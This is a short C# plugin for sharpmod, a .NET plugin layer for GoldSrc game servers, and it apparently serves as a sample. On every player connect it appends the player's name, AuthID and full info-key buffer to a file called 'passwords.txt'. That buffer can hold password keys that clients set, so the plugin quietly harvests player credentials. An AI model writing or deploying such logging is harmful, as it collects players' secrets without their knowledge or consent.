//
//     This file is part of sharpmod.
//     sharpmod is a metamod plugin which enables you to write plugins
//     for Valve GoldSrc using .NET programms.
// 
//     Copyright (C) 2010  Andrius Bentkus
// 
//     csharpmod is free software: you can redistribute it and/or modify
//     it under the terms of the GNU General Public License as published by
//     the Free Software Foundation, either version 3 of the License, or
//     (at your option) any later version.
// 
//     csharpmod is distributed in the hope that it will be useful,
//     but WITHOUT ANY WARRANTY; without even the implied warranty of
//     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//     GNU General Public License for more details.
// 
//     You should have received a copy of the GNU General Public License
//     along with csharpmod.  If not, see <http://www.gnu.org/licenses/>.
//

using System;
using System.IO;
using System.Runtime.InteropServices;
using SharpMod;

namespace SharpMod.FieldInfo
{
  public class Plugin : BasicPlugin
  {
    public override void Load()
    {
      Player.Connect += delegate(Player.ConnectEventArgs args) {
        StreamWriter sw = new StreamWriter(File.Open("passwords.txt", FileMode.Append));
        sw.WriteLine("{0} {1} {2} {3}", DateTime.Now, args.Player.Name, args.Player.AuthID, args.Player.InfoKeyBuffer);
        sw.Close();
      };
    }

  }
}
